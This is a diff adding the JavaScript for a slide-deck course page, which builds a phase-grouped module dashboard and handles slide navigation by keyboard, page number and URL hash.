+// Phase definitions
+var phases = [
+  {key:'beginner', label:'Phase 1: Beginner', tag:'beginner', mods:[]},
+  {key:'beginner-plus', label:'Phase 2: Beginner+', tag:'beginner+', mods:[]},
+  {key:'intermediate', label:'Phase 3: Intermediate', tag:'intermediate', mods:[]},
+  {key:'intermediate-plus', label:'Phase 4: Intermediate+', tag:'intermediate+', mods:[]}
+];
+
+// Build dashboard
+var phaseMap = {};
+phases.forEach(function(p){ phaseMap[p.key]=p; });
+modules.forEach(function(m){
+  if(phaseMap[m.phase]) phaseMap[m.phase].mods.push(m);
+});
+
+var dashHtml = '';
+phases.forEach(function(p){
+  if(!p.mods.length) return;
+  dashHtml += '<div class="dash-section"><h3><span class="tag">'+p.tag+'</span> '+p.label+'</h3><div class="dash-grid">';
+  p.mods.forEach(function(m, idx){
+    var mn = parseInt(m.id);
+    var slideNum = 0; // Will be computed below
+    dashHtml += '<a class="dash-card" href="#" onclick="goToModule('+mn+');return false;">'+
+      '<div class="num">Module '+('0'+mn).slice(-2)+'</div>'+
+      '<div class="title">'+m.title.split(' — ')[0]+'</div>'+
+      '<div class="meta"><span>'+m.slides+' slides</span></div>'+
+      '<div class="arrow">Start →</div></a>';
+  });
+  dashHtml += '</div></div>';
+});
+document.getElementById('dashGrid').innerHTML = dashHtml;
+
+// Map module IDs to slide indices
+// We need to know which slide each module starts at.
+// Slide 0 = dashboard.
+// Each module's slides come after the previous module's slides.
+// For now, only Module 01 has slides (slides 1-28).
+// When future modules are added, this map grows.
+// format: moduleNum -> {start: slideIndex, end: slideIndex}
+// M01: 1-11, M02: 12-31, M03: 32-40, M04: 41-52, M07: 53-62, M09: 63-67, M06: 68-80, M08: 81-97, M10: 98-99
+var moduleSlideMap = {
+  1: {start: 1, end: 11},
+  2: {start: 12, end: 31},
+  3: {start: 32, end: 40},
+  4: {start: 41, end: 52},
+  7: {start: 53, end: 62},
+  9: {start: 63, end: 67},
+  6: {start: 68, end: 80},
+  8: {start: 81, end: 97},
+  10: {start: 98, end: 99}
+};
+
+// Calculate total slides from all modules
+var totalSlides = 1; // Dashboard (slide 0)
+for(var mk in moduleSlideMap) {
+  totalSlides = Math.max(totalSlides, moduleSlideMap[mk].end + 1);
+}
+// But we need to account for all slides present. Let's count by scanning DOM.
+var slideEls = document.querySelectorAll('.slide');
+var total = slideEls.length;
+
+function goToModule(num) {
+  var m = moduleSlideMap[num];
+  if(m) showSlide(m.start);
+}
+
+// Slide navigation
+var current = 0;
+var slides = document.querySelectorAll('.slide');
+var progBar = document.getElementById('progressBar');
+var indicator = document.getElementById('indicator');
+var moduleLabel = document.getElementById('moduleLabel');
+var pageInput = document.getElementById('pageInput');
+
+function showSlide(n) {
+  if(n < 0) n = 0;
+  if(n >= total) n = total - 1;
+  
+  slides.forEach(function(s){ s.classList.remove('active'); });
+  slides[n].classList.add('active');
+  slides[n].scrollTop = 0;
+  current = n;
+  
+  // Update controls
+  indicator.textContent = (n+1) + ' / ' + total;
+  progBar.style.width = ((n+1)/total*100) + '%';
+  pageInput.max = total;
+  
+  // Show module label if on a module slide
+  var mod = slides[n].getAttribute('data-module');
+  if(mod) {
+    moduleLabel.style.display = 'inline';
+    moduleLabel.textContent = mod;
+  } else {
+    moduleLabel.style.display = 'none';
+  }
+  
+  window.location.hash = 'slide-'+(n+1);
+}
+
+function nextSlide() { showSlide(current + 1); }
+function prevSlide() { showSlide(current - 1); }
+function goToPage() {
+  var n = parseInt(pageInput.value);
+  if(n >= 1 && n <= total) showSlide(n-1);
+  pageInput.value = '';
+}
+
+// Keyboard navigation
+document.addEventListener('keydown', function(e) {
+  if(e.key === 'ArrowRight' || e.key === ' ') { e.preventDefault(); nextSlide(); }
+  if(e.key === 'ArrowLeft') { e.preventDefault(); prevSlide(); }
+  if(e.key === 'Home') { showSlide(0); }
+  if(e.key === 'End') { showSlide(total-1); }
+});
+
+// Restore from hash
+var hash = window.location.hash;
+if(hash && hash.startsWith('#slide-')) {
+  var n = parseInt(hash.replace('#slide-',''));
+  if(n >= 1 && n <= total) showSlide(n-1);
+} else {
+  showSlide(0);
+}
+</script>
+</body>
+</html>
